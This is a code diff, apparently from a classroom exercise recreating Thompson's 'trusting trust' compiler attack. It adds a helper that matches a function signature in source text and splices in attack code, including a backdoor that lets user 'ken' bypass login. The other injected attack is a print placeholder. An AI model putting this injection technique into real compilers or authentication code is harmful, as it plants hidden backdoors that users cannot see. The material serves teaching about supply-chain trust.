@@ -11,6 +11,29 @@
 
 #define error(args...) do { fprintf(stderr, ##args); exit(1);  } while(0)
 
+static char* inject_attack(char *program, char* pattern, char* attack){
+    char* match_ptr = strstr(program, pattern);
+
+    if (match_ptr != NULL){
+        char* start_second_part = match_ptr + strlen(pattern);
+
+        size_t len_first_part = match_ptr - program; 
+        size_t len_to_insert = strlen(attack);
+        size_t len_second_part = strlen(start_second_part);
+        size_t new_size = len_first_part + strlen(pattern) + len_to_insert + len_second_part + 1;
+
+        char* new_prog = malloc(sizeof(char) * new_size);
+        strncpy(new_prog, program, len_first_part);
+        new_prog[len_first_part] = '\0'; // for strcat
+        strcat(new_prog, pattern);
+        strcat(new_prog, attack);
+        strcat(new_prog, start_second_part);
+        return new_prog;
+    } else {
+        return NULL;
+    }
+}
+
 // a not very interesting compile: throw the input into a 
 // temporary file and then call gcc on the result.
 static void compile(char *program, char *outname) {
@@ -24,29 +47,15 @@ static void compile(char *program, char *outname) {
  
     // match on the start of the login() routine:
     static char login_sig[] = "int login(char *user) {";
-
-    char* match_ptr = strstr(program, login_sig);
-
-    // and inject an attack for "ken":
     static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
 
-    char* start_second_part = match_ptr + strlen(login_sig);
-
-    size_t len_first_part = match_ptr - program; // unchanged, before "int login ..."
-    size_t len_to_insert = strlen(login_attack);
-    size_t len_second_part = strlen(start_second_part); // unchange, follows login attack;
-    size_t new_size = len_first_part + strlen(login_sig) + len_to_insert + len_second_part + 1;
-
-    char new_prog[new_size];
-    strncpy(new_prog, program, len_first_part);
-    new_prog[len_first_part] = '\0'; // for strcat
-    strcat(new_prog, login_sig);
-    strcat(new_prog, login_attack);
-    strcat(new_prog, start_second_part);
-     
-    fprintf(fp, "%s", new_prog);
-
-    fclose(fp);
+    char* new_login = inject_attack(program, login_sig, login_attack);
+    if (new_login != NULL){
+        fprintf(fp, "%s", new_login);
+        free(new_login);
+        fclose(fp);
+    }
+       
     /*****************************************************************
      * Step 2:
      */
@@ -63,9 +72,13 @@ static void compile(char *program, char *outname) {
     // not much of an attack.   this is just a quick placeholder.
     static char compile_attack[] 
               = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";
-
-
-
+       
+    char* new_compile = inject_attack(program, compile_sig, compile_attack);
+    if (new_compile != NULL){
+        fprintf(fp, "%s", new_compile);
+        free(new_compile);
+        fclose(fp);
+    }
     /************************************************************
      * don't modify the rest.
      */
